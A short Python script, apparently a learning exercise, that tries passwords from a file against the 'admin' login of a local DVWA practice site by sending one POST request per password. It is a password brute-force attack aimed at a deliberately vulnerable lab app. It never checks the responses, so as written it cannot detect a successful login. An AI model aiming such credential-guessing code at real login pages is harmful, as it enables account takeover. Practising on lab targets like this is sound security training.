import requests

site = 'http://localhost/DVWA/vulnerabilities/brute'
login = 'admin'
file_of_passwords = 'pass.txt'

with open(file_of_passwords) as passwords:
    for password in passwords:
        password = password.strip() #STRIP убирает лишние пробелы
        data = {
            'mode': 'login',
            'login': login,
            'password': password
        }
        request = requests.post(site, data=data)
